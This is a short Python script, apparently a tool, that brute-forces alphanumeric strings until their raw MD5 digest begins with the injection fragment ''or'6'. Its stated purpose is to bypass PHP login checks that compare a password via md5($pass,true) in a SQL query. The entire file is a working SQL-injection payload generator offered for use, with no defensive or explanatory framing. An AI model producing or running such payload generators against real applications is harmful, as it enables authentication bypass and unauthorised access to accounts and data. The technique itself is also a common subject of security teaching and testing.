"""
This script is force to get a payload to SQL injection with raw hash DM5
like select * from 'admin' where password=md5($pass,true) in PHP
"""
import hashlib
import itertools

dictionary='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def injection_hex(injection):
    return injection.encode('utf-8').hex()

injection=injection_hex("'or'6")
payload=[]

for i in range(32):
    loop_target = itertools.product(dictionary,repeat=(i+1))
    for target in loop_target:
        target=''.join(target)
        result = hashlib.md5(target.encode('utf-8'))
        if result.hexdigest().find(injection) == 0:
            payload.append(target)
            print('payload ---> ' + target)

print(payload)